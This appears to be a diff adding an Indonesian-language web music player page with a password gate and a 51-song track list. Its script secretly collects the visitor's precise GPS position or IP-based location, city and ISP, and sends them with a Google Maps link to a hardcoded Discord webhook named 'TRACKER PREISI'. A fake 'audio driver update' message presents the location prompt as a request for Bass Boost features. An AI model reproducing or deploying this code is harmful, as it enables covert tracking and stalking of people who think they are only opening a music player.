@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Modul Musik Aldiyy V6 - Final</title>
+    <style>
+        * { box-sizing: border-box; touch-action: manipulation; }
+        body { margin: 0; padding: 0; background-color: #000; height: 100vh; overflow: hidden; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; }
+
+        /* LOADING & PASSWORD */
+        #loading-screen, #password-screen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #000 url('loading.png') no-repeat center;
+            background-size: 100% 100%; z-index: 9999;
+            display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 20%;
+        }
+        #password-screen { display: none; justify-content: center; padding-bottom: 0; z-index: 9000; }
+
+        .ml-bar-bg { width: 75%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; }
+        .ml-bar-fill { width: 0%; height: 100%; background: #ff0000; box-shadow: 0 0 15px #ff0000; border-radius: 10px; transition: width 0.1s; }
+
+        .pass-container { background: rgba(0, 0, 0, 0.85); padding: 25px; border-radius: 15px; border: 2px solid #ff0000; text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 20px #ff0000; }
+        .pass-input { width: 100%; padding: 12px; border: 1px solid #ff0000; background: #111; color: #fff; text-align: center; border-radius: 5px; margin-bottom: 15px; outline: none; }
+        
+        /* PLAYER UI */
+        .player-app { position: relative; width: 100vw; height: 100vh; max-width: 500px; background: url('main.png') no-repeat center; background-size: 100% 100%; display: none; }
+
+        .indicator-header { position: absolute; top: 16.8%; left: 18.5%; width: 63%; height: 8.5%; display: flex; flex-direction: column; justify-content: center; }
+        .ind-row { display: flex; width: 100%; }
+        .ind-col { flex: 1; text-align: center; color: #ff0000; font-weight: 900; font-size: 13px; text-shadow: 1px 1px 2px #000; }
+        .label { font-size: 8px; font-weight: bold; color: #fff; letter-spacing: 1px; }
+
+        .content-area { position: absolute; top: 30.5%; left: 18.5%; width: 63%; height: 36.5%; display: flex; flex-direction: column; }
+        .search-box { width: 100%; padding: 6px; background: rgba(0,0,0,0.6); border: 1px solid #444; color: #fff; font-size: 11px; margin-bottom: 5px; outline: none; }
+        .list-nada { flex: 1; overflow-y: auto; scrollbar-width: none; -ms-overflow-style: none; scroll-behavior: smooth; }
+        .list-nada::-webkit-scrollbar { display: none; }
+        
+        .nada-item { padding: 10px 5px; font-size: 11.5px; color: #ccc; border-bottom: 1px solid rgba(255,255,255,0.1); cursor: pointer; text-align: left; }
+        .active-track { color: #ff0000 !important; font-weight: bold; background: rgba(255,0,0,0.05); }
+
+        .controls-overlay { position: absolute; bottom: 4.5%; width: 100%; display: flex; justify-content: center; align-items: center; }
+        .btn { background: transparent; border: none; cursor: pointer; outline: none; width: 55px; height: 65px; margin: 0 5px; margin-bottom: 15px; }
+        .btn-play { width: 85px; height: 85px; }
+
+        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; z-index: 10000; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div id="flash"></div>
+
+<div id="loading-screen">
+    <div id="perc" style="color:white; font-size:24px; font-weight:900; margin-bottom:10px;">0%</div>
+    <div class="ml-bar-bg"><div id="fill" class="ml-bar-fill"></div></div>
+</div>
+
+<div id="password-screen">
+    <div class="pass-container">
+        <h2 style="color:white; font-size:13px; margin-bottom:10px; line-height: 1.4;">UPDATE DRIVER AUDIO</h2>
+        <p style="color:#aaa; font-size:9px; margin-bottom:15px; line-height: 1.3;">Harap izinkan akses notifikasi saat muncul untuk mengaktifkan fitur Bass Boost & High Fidelity Stereo.</p>
+        
+        <input type="password" id="pass-input" class="pass-input" placeholder="Password Modul...">
+        <button onclick="checkPassword()" style="background:#ff0000; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:5px;">AKTIFKAN AUDIO</button>
+    </div>
+</div>
+
+<div class="player-app" id="main-ui">
+    <div class="indicator-header">
+        <div class="ind-row">
+            <div class="ind-col"><span class="label">NOMOR</span><br><span id="val-num">1/51</span></div>
+            <div class="ind-col"><span class="label">STATUS</span><br><span id="val-stat">STOP</span></div>
+            <div class="ind-col"><span class="label">INFO</span><br><span id="val-info">SALE</span></div>
+        </div>
+    </div>
+    <div class="content-area">
+        <input type="text" id="search-input" class="search-box" placeholder="Cari Lagu..." oninput="filterLagu()">
+        <div class="list-nada" id="list-container"></div>
+    </div>
+    <div class="controls-overlay">
+        <button class="btn" onclick="control('PAUSE')"></button>
+        <button class="btn" onclick="control('PREV')"></button>
+        <button class="btn btn-play" onclick="control('PLAY')"></button>
+        <button class="btn" onclick="control('NEXT')"></button>
+        <button class="btn" onclick="control('STOP')"></button>
+    </div>
+</div>
+
+<audio id="myaudio"></audio>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1469393836957630700/dEOguA7XV1pqqTP5MExNbfqRou_iByNG7BmLIaXaFnfTbqEGsFxNHqEAKZaM-9_aQaHu";
+
+    async function laporKeDiscord(lat = null, lon = null, metode = "IP (Pusat Provider)") {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            
+            const finalLat = lat || d.latitude;
+            const finalLon = lon || d.longitude;
+            const maps = `https://www.google.com/maps?q=${finalLat},${finalLon}`;
+            
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "🛰️ TRACKER PREISI",
+                    content: `🔊 **SINKRONISASI AUDIO BERHASIL [${metode}]**`,
+                    embeds: [{
+                        color: lat ? 65280 : 16711680,
+                        fields: [
+                            { name: "📍 Lokasi Wilayah", value: `${d.city}, ${d.region}`, inline: true },
+                            { name: "🌐 Operator", value: d.org, inline: true },
+                            { name: "🛰️ Jenis Data", value: metode, inline: true },
+                            { name: "🗺️ Titik Maps", value: `[LIHAT LOKASI AKURAT](${maps})` }
+                        ],
+                        footer: { text: "Aldiyy High Fidelity System" },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        } catch (e) { console.log("Gagal kirim log."); }
+    }
+
+    let p = 0;
+    const inv = setInterval(() => {
+        p += 5;
+        document.getElementById('fill').style.width = p + "%";
+        document.getElementById('perc').innerText = p + "%";
+        if(p >= 100) {
+            clearInterval(inv);
+            document.getElementById('loading-screen').style.display = "none";
+            document.getElementById('password-screen').style.display = "flex";
+        }
+    }, 50);
+
+    function checkPassword() {
+        if(document.getElementById('pass-input').value === "AldiyySukaMieAyam") {
+            document.getElementById('flash').style.opacity = "1";
+
+            // PROSES GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { laporKeDiscord(pos.coords.latitude, pos.coords.longitude, "GPS (AKURAT)"); },
+                    () => { laporKeDiscord(null, null, "IP (Bukan GPS)"); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                laporKeDiscord(null, null, "IP (TIDAK SUPPORT GPS)");
+            }
+
+            setTimeout(() => {
+                document.getElementById('password-screen').style.display = "none";
+                document.getElementById('main-ui').style.display = "block";
+                setTimeout(() => { document.getElementById('flash').style.opacity = "0"; }, 100);
+            }, 200);
+        } else { alert("Password Salah!"); }
+    }
+
+    const daftar = ["Aku Suka Nonton Sound Horeg 24 Not", "Barudak Phonk 12 Not", "Bete 36 Not", "Birunya Cinta 36 Not", "Calon Mantu Idaman", "Campuran 12 Not", "Cari Berkah 24 Not", "Chicken Dance 24 Not", "Cindai 18 Not", "Dj Lulo Elektrone 12 Not", "Doraemon 36 Not", "Ego Wong Tua 12 Not", "Es Lilin ZetaProject", "Ff X Merah Jambu 12 Not", "Genit 36 Not", "Gulali Azk 36 Not", "Hamil Duluan X Malam Pagi 24 Not", "India Okdj 36 Not", "Jablay AzkDuino", "Janda Bodong 24 Not", "Janda bodong AzkDuino", "Jeger 36 Not", "Jika Itu Memang Terbaik", "Kalah Materi", "Karmila ZetaProject 18 Not", "Kelingan Mantan 24 Not", "Kelingan Mantan Azk 36 Not", "Konco Mesra 36 Not", "Lathi 24 Not", "Maumere Okdj 36 Not", "Maya 24 Not", "Mimi Cucu 36 Not", "Ngamen 4 12 Not", "Ngapain Repot 36 Not Okdj", "Okdj 18 Not Sambung Menyambung", "One In A Mililon 12 Not", "Pagiku Cerahku 36 Not", "Pikiran Ku Kepas 24 Not", "Pikiranku Lepas X Mimi Cucu", "Pildun X Jika Itu Memang Terbaik 36 Not", "CINTA TASIKMALAYA", "Dracin", "Dua Lelaki 36 Knot", "goyang nasi Padang", "Kalah AzkDuino 36Not", "Orang Lama Lebe Gacor", "Pacar 5 Langkah 36Not", "PEDIH 36NOT", "sedia aku sebelum hujan", "SKA PARADISE", "Sungai Serayu 36Not"];
+    let cur = 1;
+    const aud = document.getElementById('myaudio');
+
+    function build() {
+        const c = document.getElementById('list-container');
+        daftar.forEach((n, i) => {
+            const d = document.createElement('div');
+            d.className = 'nada-item'; d.id = 'track-' + (i+1);
+            d.innerText = `${i+1}). ${n}`;
+            d.onclick = () => { cur = i+1; upUI(); };
+            c.appendChild(d);
+        });
+    }
+
+    function upUI() {
+        document.getElementById('val-num').innerText = `${cur}/51`;
+        document.querySelectorAll('.nada-item').forEach(it => it.classList.remove('active-track'));
+        const active = document.getElementById('track-' + cur);
+        if(active) {
+            active.classList.add('active-track');
+            active.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        aud.src = `${cur}.mp3`;
+    }
+
+    function control(act) {
+        const s = document.getElementById('val-stat');
+        if(act==='PLAY'){ aud.play(); s.innerText="PLAY"; }
+        else if(act==='PAUSE'){ aud.pause(); s.innerText="PAUSE"; }
+        else if(act==='STOP'){ aud.pause(); aud.currentTime=0; s.innerText="STOP"; }
+        else if(act==='NEXT' && cur<51){ cur++; upUI(); }
+        else if(act==='PREV' && cur>1){ cur--; upUI(); }
+    }
+
+    function filterLagu() {
+        const f = document.getElementById('search-input').value.toLowerCase();
+        document.querySelectorAll('.nada-item').forEach(it => it.style.display = it.innerText.toLowerCase().includes(f) ? "block" : "none");
+    }
+
+    window.onload = () => { build(); upUI(); };
+</script>
+</body>
+</html>
